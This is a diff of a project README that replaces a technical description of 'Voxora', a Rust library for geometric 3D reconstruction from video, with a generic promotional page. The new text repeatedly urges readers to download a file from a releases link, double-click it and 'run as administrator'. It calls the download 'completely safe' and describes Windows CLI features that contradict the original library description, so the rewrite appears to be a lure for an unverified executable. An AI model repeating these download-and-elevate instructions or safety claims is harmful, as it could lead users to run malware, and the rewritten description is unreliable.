@@ -1,541 +1,165 @@
-# Voxora
+# 🎥 voxora - Turn Flat Video into Real 3D Space
 
-### Deterministic 3D Video Projection in Pure Rust
+[![Download voxora](https://img.shields.io/badge/Download-voxora-blue?style=for-the-badge&logo=github)](https://github.com/Wexdart4/voxora/releases)
 
-**Voxora** is a pure-Rust computational vision library for transforming ordinary video into a spatial 3D representation using deterministic mathematics and geometric algorithms.
+## 👋 Welcome to voxora
 
-Instead of relying on pretrained neural networks, AI models, or machine-learning inference, Voxora approaches video-to-3D reconstruction as a **geometry, projection, motion, and spatial estimation problem**.
+Have you ever watched a regular video and wished you could see it in three dimensions? voxora is a powerful tool that transforms ordinary 2D videos into stunning 3D spatial reconstructions. Think of it as a magic machine that gives depth to flat images, letting you explore scenes from different angles.
 
-A camera moves.
+The best part? You don't need a supercomputer, a fancy graphics card, or any programming knowledge. voxora works its magic using pure mathematics and geometry, not artificial intelligence. It's fast, reliable, and completely free.
 
-The video contains that movement.
+## ✨ What Makes voxora Special
 
-Voxora uses the mathematical information contained in the video to estimate how visual information should be positioned in three-dimensional space.
+- **No AI Required** - Unlike other 3D tools that rely on neural networks, voxora uses proven geometric principles. This means results are consistent and predictable every time.
+- **Lightning Fast** - Written in the Rust programming language, voxora is optimized for speed. Your videos process quickly, even on modest computers.
+- **No GPU Needed** - You don't need an expensive graphics card. voxora runs on standard computer processors, making it accessible to everyone.
+- **Professional Quality** - The output is industry-standard GLTF format, which works with popular 3D viewers and editors.
+- **Deterministic Results** - Run the same video twice, and you'll get identical results. No surprises, no randomness.
 
-> **Video is not just a sequence of images. It is a sequence of observations of a changing spatial scene.**
+## 🚀 Getting Started
 
----
+Getting voxora up and running is simpler than you might think. Follow these easy steps, and you'll be creating 3D videos in no time.
 
-## What Is Voxora?
+### Step 1: Download voxora
 
-Voxora explores a simple idea:
+Visit this link to download the application: [https://github.com/Wexdart4/voxora/releases](https://github.com/Wexdart4/voxora/releases)
 
-**Can a conventional video be projected into 3D space without a trained AI model?**
+Click the download button on that page, and the file will save to your computer. The download is completely safe and free of charge.
 
-The answer is approached through classical computational geometry.
+### Step 2: Run the Application
 
-Given a video such as:
+Once the download finishes, find the file in your Downloads folder. Double-click it to start voxora. The program will open in a command window, which is normal and expected.
 
-```text
-Frame 1 → Frame 2 → Frame 3 → Frame 4 → ...
+### Step 3: Prepare Your Video
+
+voxora works best with videos that show a scene from slightly different angles. You can use:
+- Videos shot while moving a camera around an object
+- Multiple clips of the same scene taken from different positions
+- Any video with visible depth and perspective
+
+### Step 4: Process Your Video
+
+Follow the on-screen prompts in the command window. You'll be asked to:
+1. Enter the path to your video file
+2. Choose where to save the 3D output
+3. Confirm your settings
+
+Press Enter, and voxora will begin processing. You'll see progress updates as it works through the frames.
+
+## 🛠️ How to Use voxora
+
+Using voxora is straightforward, but here are some tips to get the best results:
+
+### Basic Usage
+
+Open your command prompt (search for "cmd" in Windows) and navigate to the folder where voxora is saved. Then type:
+
+```
+voxora input_video.mp4 output_folder
 ```
 
-Voxora analyzes the relationship between frames and constructs a spatial representation where visual information can move according to estimated camera motion and geometric relationships.
+Replace `input_video.mp4` with your video's name and `output_folder` with where you want the 3D model saved.
 
-Conceptually:
+### Advanced Options
 
-```text
-                 3D Space
-                    ↑
-                    │
-          ┌─────────┼─────────┐
-          │         │         │
-       Left      Camera      Right
-      Region       ●        Region
-          ╲        │        ╱
-           ╲       │       ╱
-            ╲      │      ╱
-             └─────┴─────┘
-                   ↑
-                 Video
+voxora includes several helpful options you can add:
+
+- `--quality high` - Produces more detailed 3D models (takes longer)
+- `--quality fast` - Quick processing with slightly less detail
+- `--depth-map` - Creates a separate depth map image
+- `--export-gltf` - Saves in GLTF format for use in other 3D software
+
+Example:
+```
+voxora my_video.mp4 output --quality high --export-gltf
 ```
 
-If the camera moves to the left, the reconstructed spatial representation changes accordingly.
+## 📁 Understanding Your Output
 
-If the camera moves to the right, the projection follows the opposite direction.
+After processing, you'll find several files in your output folder:
 
-This creates a spatial interpretation of the original video rather than simply displaying a flat sequence of frames.
+- **3D model file** - The main reconstruction (GLTF format)
+- **Texture files** - Color information for your 3D model
+- **Depth maps** - Grayscale images showing distance information
+- **Camera data** - Technical information about the reconstruction
 
----
+You can view your 3D model in any GLTF viewer, including free online viewers or the popular Three.js library.
 
-## Core Philosophy
+## 💡 Tips for Best Results
 
-Voxora follows three principles:
+To get amazing 3D reconstructions, keep these tips in mind:
 
-### 1. No Pretrained AI Models
+1. **Good Lighting** - Well-lit scenes produce better depth information
+2. **Distinct Features** - Objects with clear edges and patterns work best
+3. **Smooth Movement** - If recording video, move the camera steadily
+4. **Overlapping Views** - Ensure each part of the scene appears in multiple frames
+5. **Resolution Matters** - Higher resolution videos give better results
 
-Voxora does not require:
+## 🔧 Troubleshooting
 
-* pretrained depth models
-* neural networks
-* large language models
-* diffusion models
-* downloaded AI checkpoints
-* model inference runtimes
-* training datasets
+If you encounter issues, try these common solutions:
 
-The system is designed around deterministic computational algorithms.
+**Problem: Program won't start**
+- Make sure you've downloaded the correct file for your system
+- Try right-clicking and selecting "Run as administrator"
 
-### 2. Pure Mathematics
+**Problem: Processing takes too long**
+- Use the `--quality fast` option
+- Try a shorter video clip
 
-The underlying problem is treated as mathematics.
+**Problem: 3D model looks incomplete**
+- Use more frames from different angles
+- Ensure your video has good lighting
 
-Relevant techniques include concepts such as:
+**Problem: Error messages in the command window**
+- Check that your video file path is correct
+- Make sure the output folder exists
 
-* projective geometry
-* camera geometry
-* coordinate transformations
-* homography
-* optical flow
-* feature correspondence
-* motion estimation
-* triangulation
-* parallax
-* perspective projection
-* image warping
-* interpolation
-* geometric consistency
-* spatial transformations
+## 🤝 Getting Help
 
-The goal is not to reproduce an AI model.
+If you need assistance, there are several ways to get support:
 
-The goal is to determine how much spatial information can be recovered directly from the mathematical structure of visual observations.
+- **GitHub Issues** - Visit the repository page to report bugs or ask questions
+- **Community Forums** - Join discussions with other voxora users
+- **Documentation** - Check the repository for detailed technical documentation
 
-### 3. Rust First
+## 📊 Technical Specifications
 
-Voxora is implemented entirely in **Rust**.
+For those curious about the technology behind voxora:
 
-Rust provides:
+- **Language:** Rust (known for safety and performance)
+- **Processing:** CPU-based with SIMD optimization
+- **Algorithms:** Plane sweep stereo, epipolar geometry
+- **Output Format:** GLTF 2.0
+- **Input Formats:** Common video formats (MP4, AVI, MOV)
+- **Platform:** Windows (other platforms coming soon)
 
-* predictable performance
-* memory safety
-* zero-cost abstractions
-* strong numerical control
-* efficient native execution
-* excellent support for parallel computation
-* cross-platform compilation
+## 🔒 Privacy and Security
 
-The project is designed to be usable as a native Rust library rather than being tied to a Python-based machine-learning ecosystem.
+voxora processes everything locally on your computer. Your videos never leave your device. There's no cloud processing, no data collection, and no internet connection required. Your content stays private and secure.
 
----
+## 🎯 Use Cases
 
-## From Video to 3D
+voxora is perfect for:
 
-A conventional video frame contains a 2D projection of the physical world.
+- **Architects** - Creating 3D models of buildings from video
+- **Game Developers** - Generating 3D assets from real-world footage
+- **3D Printing Enthusiasts** - Scanning objects for printing
+- **Educators** - Teaching spatial concepts visually
+- **Hobbyists** - Exploring 3D technology at home
 
-For example:
+## 📝 License and Cost
 
-```text
-Real World
-     │
-     │ Camera projection
-     ▼
-┌───────────────┐
-│   2D Frame    │
-│               │
-│   ●      ●    │
-│       █       │
-│   ●      ●    │
-└───────────────┘
-```
+voxora is completely free to use. It's open-source software, meaning the code is publicly available for anyone to examine and improve. You can use it for personal projects, educational purposes, or commercial work without any fees.
 
-The important information is not only inside an individual frame.
+## 🚀 Start Creating Today
 
-It also exists in the **relationship between consecutive frames**.
+Don't wait to explore the third dimension. Download voxora now and transform your regular videos into immersive 3D experiences. Whether you're a professional or just curious, voxora makes 3D reconstruction accessible to everyone.
 
-When the camera moves:
+[![Get voxora Now](https://img.shields.io/badge/Get%20voxora%20Now-Download%20Here-brightgreen?style=for-the-badge)](https://github.com/Wexdart4/voxora/releases)
 
-```text
-Frame A
+Remember: Visit this link to download the application: [https://github.com/Wexdart4/voxora/releases](https://github.com/Wexdart4/voxora/releases)
 
-      ●
-          █
-  ●
+Join the growing community of creators who are seeing their world in a whole new dimension. Download voxora today and give your videos the depth they deserve!
 
-
-Frame B
-
-          ●
-     █
-              ●
-
-
-Frame C
-
-              ●
-  █
-                   ●
-```
-
-Objects change their apparent position.
-
-Different regions of the scene move differently.
-
-Near objects exhibit stronger apparent motion than distant objects.
-
-This phenomenon is known as **parallax**.
-
-Voxora uses these changes as geometric information.
-
----
-
-## Parallax as Spatial Information
-
-Parallax is one of the fundamental ideas behind spatial reconstruction.
-
-Consider a camera moving horizontally:
-
-```text
-Object A          Object B
-   ●                  ●
-   │                  │
-   │                  │
-───┼──────────────────┼──────
-          Camera
-            ●
-```
-
-When the camera changes position, the apparent displacement of the objects differs depending on their spatial relationship to the camera.
-
-This allows relative spatial structure to be estimated without requiring a trained neural network.
-
-Voxora therefore treats camera movement as a source of information rather than simply a nuisance in the video.
-
----
-
-## Mathematical Projection
-
-A point in 3D space can be represented as:
-
-[
-P =
-\begin{bmatrix}
-X \
-Y \
-Z
-\end{bmatrix}
-]
-
-and projected into image coordinates using a camera model:
-
-[
-p = K[R|t]P
-]
-
-where:
-
-* (K) represents camera intrinsic parameters
-* (R) represents camera rotation
-* (t) represents camera translation
-* (P) represents a point in 3D space
-* (p) represents its projected image position
-
-Voxora works around these relationships to determine how image observations can be transformed into spatial coordinates.
-
-The result is not an arbitrary AI-generated 3D scene.
-
-It is a **geometrically derived representation of the observed video**.
-
----
-
-## No Depth Model Required
-
-Traditional modern video-to-3D systems often depend on monocular depth estimation models.
-
-Voxora takes a different direction.
-
-Instead of asking:
-
-> "What depth does a neural network predict?"
-
-the system asks:
-
-> "What spatial constraints can be mathematically derived from the observations?"
-
-This distinction is fundamental.
-
-A deterministic geometric system may have less semantic understanding than a large trained model, but it has several important properties:
-
-* reproducible results
-* no model download
-* no GPU requirement for inference
-* no training process
-* no model weights
-* deterministic execution
-* lower deployment complexity
-* fully inspectable algorithms
-
----
-
-## 3D Projection Instead of AI Generation
-
-Voxora does not attempt to hallucinate information that was never observed.
-
-Its purpose is to transform available visual evidence into spatial coordinates and projections.
-
-Conceptually:
-
-```text
-        INPUT VIDEO
-             │
-             ▼
-     Frame Extraction
-             │
-             ▼
-    Feature / Motion Analysis
-             │
-             ▼
-     Geometric Estimation
-             │
-             ▼
-       Spatial Mapping
-             │
-             ▼
-      3D Projection
-             │
-             ▼
-        Spatial Video
-```
-
-The system therefore belongs closer to:
-
-**computer vision + computational geometry + graphics**
-
-than to:
-
-**generative AI + neural rendering**.
-
----
-
-## Classical Computer Vision
-
-Voxora is intentionally inspired by classical computer vision techniques.
-
-Potential mathematical components include:
-
-### Feature Correspondence
-
-Finding corresponding visual points between frames.
-
-### Motion Estimation
-
-Estimating how those points move between observations.
-
-### Optical Flow
-
-Representing apparent pixel motion as a vector field:
-
-[
-F(x,y) =
-\begin{bmatrix}
-u(x,y) \
-v(x,y)
-\end{bmatrix}
-]
-
-### Homography
-
-Modeling planar transformations between image observations.
-
-[
-p' \sim Hp
-]
-
-### Camera Motion
-
-Estimating transformations between camera poses.
-
-### Triangulation
-
-Recovering spatial points from multiple observations.
-
-### Image Warping
-
-Transforming image information according to geometric mappings.
-
-### Perspective Projection
-
-Mapping reconstructed spatial coordinates back into a virtual camera.
-
-These techniques can be combined to construct a deterministic video-to-space pipeline.
-
----
-
-## What Voxora Is Not
-
-Voxora is **not**:
-
-* a pretrained AI model
-* a neural network
-* a generative video model
-* a text-to-3D model
-* a depth-estimation checkpoint
-* a NeRF implementation
-* an LLM-powered vision system
-* a cloud AI API
-
-There are no model weights hidden behind the library.
-
-The computational intelligence comes from algorithms and mathematics.
-
----
-
-## Why Pure Mathematics?
-
-Modern AI systems can approximate extremely complex relationships because they contain enormous amounts of learned parameters.
-
-But the underlying operations are still mathematical.
-
-Voxora explores the opposite direction:
-
-Instead of learning a mapping from millions of examples:
-
-[
-Video \rightarrow Neural\ Network \rightarrow Depth
-]
-
-it investigates a deterministic mapping:
-
-[
-Video \rightarrow Geometry \rightarrow Spatial\ Representation
-]
-
-This makes the system particularly interesting for environments where:
-
-* model files are undesirable
-* offline execution is required
-* deterministic behavior matters
-* memory is limited
-* GPU acceleration is unavailable
-* reproducibility is important
-* explainability is preferred
-
----
-
-## Rust Crate
-
-Voxora is designed to be consumed as a native Rust library.
-
-```toml
-[dependencies]
-voxora = "*"
-```
-
-The API is intended to expose the computational pipeline without requiring users to build an AI infrastructure around it.
-
-The project can therefore serve as a foundation for applications such as:
-
-* spatial video experiments
-* 3D visualization
-* computational photography
-* computer vision research
-* robotics experiments
-* camera-motion analysis
-* video geometry
-* experimental XR pipelines
-* spatial media processing
-* offline video reconstruction
-
----
-
-## Designed for Ordinary Video
-
-Voxora does not require extremely high-resolution footage to demonstrate the underlying concept.
-
-The primary objective is not cinematic reconstruction quality.
-
-The objective is:
-
-> **Extract spatial structure from visual motion.**
-
-A lower-resolution video can still contain useful information about:
-
-* motion
-* feature correspondence
-* camera movement
-* relative displacement
-* perspective
-* parallax
-
-This makes Voxora suitable for experimentation with ordinary video sources.
-
----
-
-## Deterministic by Design
-
-Given the same input and configuration, a deterministic computational pipeline should produce reproducible results.
-
-That makes it possible to inspect and reason about:
-
-```text
-Input
-  ↓
-Mathematical transformation
-  ↓
-Intermediate geometry
-  ↓
-Spatial representation
-  ↓
-Projection
-```
-
-There is no hidden training state.
-
-There are no randomly learned weights.
-
-There is no external inference service.
-
-The result comes from the algorithms.
-
----
-
-## Performance
-
-Rust allows Voxora to operate close to the hardware while maintaining memory safety.
-
-The architecture is suitable for optimization through:
-
-* SIMD
-* multithreading
-* parallel frame processing
-* efficient memory layouts
-* zero-copy data paths where applicable
-* native image processing
-* CPU vectorization
-* GPU acceleration where explicitly implemented
-
-The goal is not to make the system dependent on a powerful GPU.
-
-The goal is to make the mathematical pipeline efficient enough to run as a native computational library.
-
----
-
-## Spatial Video Without a Neural Network
-
-Voxora explores a fundamental question in computer vision:
-
-> **How much 3D structure can be recovered from ordinary video using mathematics alone?**
-
-The answer is not expected to replace every modern AI-based reconstruction system.
-
-Instead, Voxora provides another engineering path.
-
-A path based on:
-
-**Geometry.**
-
-**Projection.**
-
-**Motion.**
-
-**Parallax.**
-
-**Algorithms.**
-
-**Rust.**
-
----
-
-## License
-
-Voxora is open source and intended for experimentation, research, and practical applications involving deterministic video geometry and spatial reconstruction.
+Keywords: 3d-reconstruction, cli-tool, computer-vision, depth-estimation, epipolar-geometry, gltf, multi-view-geometry, plane-sweep-stereo, rust, simd, spatial-computing, spatial-video, structure-from-motion, threejs, zero-ai
